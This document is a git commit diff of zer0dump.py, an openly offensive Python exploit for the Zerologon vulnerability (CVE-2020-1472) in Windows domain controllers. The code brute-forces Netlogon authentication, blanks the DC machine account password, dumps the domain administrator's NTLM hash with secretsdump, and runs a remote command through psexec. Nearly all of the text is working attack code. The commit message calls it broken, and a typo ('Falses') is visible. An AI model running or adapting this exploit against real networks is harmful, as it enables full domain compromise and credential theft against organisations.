462b1dc5b6af7cf430370be3401f750be8a12ae9
bugbyt3 <elias@grif.io>
2020-09-15 21:16:27 +0000

    update repo with changes, somehow broken, will fix later

--- zer0dump.py
+++ zer0dump.py
@@ -1,14 +1,17 @@
 #!/usr/bin/env python3
 from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRENUM, NDRUNION, NDRPOINTER, NDRUniConformantArray
-from impacket.dcerpc.v5 import nrpc, epm
+from impacket.dcerpc.v5 import nrpc, epm, lsat, lsad
 from impacket.dcerpc.v5.dtypes import NULL, WSTR, LPWSTR, DWORD, ULONG, USHORT, PGUID, NTSTATUS, LONG, UCHAR, PRPC_SID, \
-    GUID, RPC_UNICODE_STRING, SECURITY_INFORMATION, LPULONG
+    GUID, RPC_UNICODE_STRING, SECURITY_INFORMATION, LPULONG, MAXIMUM_ALLOWED
 from impacket.dcerpc.v5 import transport
+import argparse
 from impacket import crypto
+from impacket.smbconnection import SMBConnection
 from struct import pack, unpack
 import hmac, hashlib, struct, sys, socket, time
 from binascii import hexlify, unhexlify
 from subprocess import check_call
+import reg
 MAX_ATTEMPTS = 2000 # False negative chance: 0.04%
 def update_authenticator(cSC, sK, timestamp):
     authenticator = nrpc.NETLOGON_AUTHENTICATOR()
@@ -59,14 +62,23 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer):
     fail(f'Unexpected error: {ex}.')
 
 
-def perform_attack(dc_handle, dc_ip, target_computer, target_da="Administrator"):
+#def getDomainSidRpc()
+
+def perform_attack(options):
   # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
   print('Performing authentication attempts...')
   rpc_con = None
+  conn = SMBConnection(options.target, options.target, None, options.port)
+  conn.login('','')
+  dc_handle = f"\\\\{conn.getServerName()}"
+  target_computer = conn.getServerName()
+  dc_ip = options.target
+
+   
+  print(dc_ip)
+  print(target_computer)
   for attempt in range(0, MAX_ATTEMPTS):
     rpc_con, serverChallenge = try_zero_authenticate(dc_handle, dc_ip, target_computer)
-
-
     if rpc_con == None:
         print('=', end='', flush=True)
     else:
@@ -77,9 +89,7 @@ def perform_attack(dc_handle, dc_ip, target_computer, target_da="Administrator")
     sessionKey = nrpc.ComputeSessionKeyStrongKey('', plaintext, serverChallenge, None)
     ppp = nrpc.ComputeNetlogonCredential(plaintext, sessionKey)
     clientStoredCredential = pack('<Q', unpack('<Q', ppp)[0] + 10)
-    CLP = nrpc.NL_TRUST_PASSWORD()
-    CLP['Buffer'] = b'\x00' * 512
-    CLP['Length'] = '\x00\x00\x00\x00'
+    print()
     blah = nrpc.hNetrServerPasswordSet2(
         rpc_con, dc_handle + '\x00',
         target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
@@ -87,6 +97,15 @@ def perform_attack(dc_handle, dc_ip, target_computer, target_da="Administrator")
         update_authenticator(clientStoredCredential, sessionKey, 0), b'\x00' * 516
     )
     blah.dump()
+#    stringbinding = epm.hept_map(options.target, lsat.MSRPC_UUID_LSAT, protocol="ncacn_ip_tcp")
+#    rpc_con = transport.DCERPCTransportFactory(stringbinding).get_dce_rpc()
+#    rpc_con.connect()
+#    rpc_con.bind(lsat.MSRPC_UUID_LSAT)
+#    resp = lsad.hLsarOpenPolicy2(rpc_con, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
+#    sid = lsad.hLsarQueryInformationPolicy2(rpc_con, resp['PolicyHandle'], lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)['PolicyInformation']['PolicyPrimaryDomainInfo']['Sid'].formatCanonical()
+#    print(sid)
+    if options.silver:
+        exit()
     import secretsdump, psexec
     class SDOptions:
         def __init__(self):
@@ -97,41 +116,49 @@ def perform_attack(dc_handle, dc_ip, target_computer, target_da="Administrator")
             self.exec_method = "smbexec"
             self.just_dc = True
             self.just_dc_ntlm = True
-            self.just_dc_user = target_da
+            self.just_dc_user = options.target_da
             self.pwd_last_set = self.user_status = self.resumefile = \
             self.k = self.history = self.ntds = self.sam = self.security = \
             self.system = self.aesKey = self.bootkey = None
             self.dc_ip = dc_ip
     class PSOptions:
         def __init__(self):
-            self.help = False
-    dump = secretsdump.DumpSecrets(dc_ip, target_computer+'$', '', '', SDOptions()).dump()
+            self.help = Falses
+    h = SMBConnection(options.target, options.target, None, options.port)
+#    if options.target_machine:
+#        h.login(options.target_machine + "$", '')
+#    else:
+#        h.login(target_computer + '$', '')
+    secretsdump.DumpSecrets(dc_ip, target_computer+'$', '', '', SDOptions()).dump()
+
     f= open("dumped.tmp.ntds").read()
 #    print(f)
     hashes = ':'.join(f.split(':')[2:-3])
     print(hashes)
-    psexec = psexec.PSEXEC('powershell.exe -c Reset-ComputerMachinePassword', None, None, None, hashes=hashes, username=target_da, serviceName='fucked')
-    psexec.run(dc_name, dc_ip)
+    psexec = psexec.PSEXEC('powershell.exe -c Reset-ComputerMachinePassword', None, None, None, hashes=hashes, username=options.target_da, serviceName='fucked')
+    psexec.run(options.target, dc_ip)
   else:
     print('\nAttack failed. Target is probably patched.')
     sys.exit(1)
 
 
 if __name__ == '__main__':
-  if not (3 <= len(sys.argv) <= 4):
-    print('Usage: %s dc_name dc_ip [target_domain_admin_username]\n' % sys.argv[0])
-    print('Exploits a domain controller that is vulnerable to the Zerologon attack (CVE-2020-1472).')
-    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
-    print("Addtl. Note: target_domain_admin_username should be a username associated with a known domain administrator of the same domain as the target DC.")
-    sys.exit(1)
+  parser = argparse.ArgumentParser(add_help=True, description="Exploits a domain controller that is vulnerable to the Zerologon attack (CVE-2020-1472).")
+  parser.add_argument('target', action='store', help='<resolvable hostname or address>')
+  parser.add_argument('-silver', action='store_true', help='Compromise target by delegating a ticket using the machine account\'s hash)')
+  parser.add_argument('-target_da', action='store', help="Specify a known target domain administrator")
+  parser.add_argument('-port', type=int, choices={445, 139}, default=445, help="SMB port (default: 445)")
+  parser.add_argument('-target_machine', action='store', help="Specify a machine to target")
+  options = parser.parse_args()
+  if len(sys.argv) == 1:
+      parser.print_help()
   else:
-
-    if len(sys.argv) == 4:
-        [_, dc_name, dc_ip, target_da] = sys.argv
-        dc_name = dc_name.rstrip('$') 
-        perform_attack('\\\\' + dc_name, dc_ip, dc_name, target_da)
-    else:
-        [_, dc_name, dc_ip] = sys.argv
-        dc_name = dc_name.rstrip('$') 
-        perform_attack('\\\\' + dc_name, dc_ip, dc_name)
+    print(options)
+    if not options.target_da:
+        options.target_da = "Administrator"
+#    if not options.target_machine:
+#        options.target_machine = options.target
+    input("::")
+    #dc_name = dc_name.rstrip('$') 
+    perform_attack(options)
 
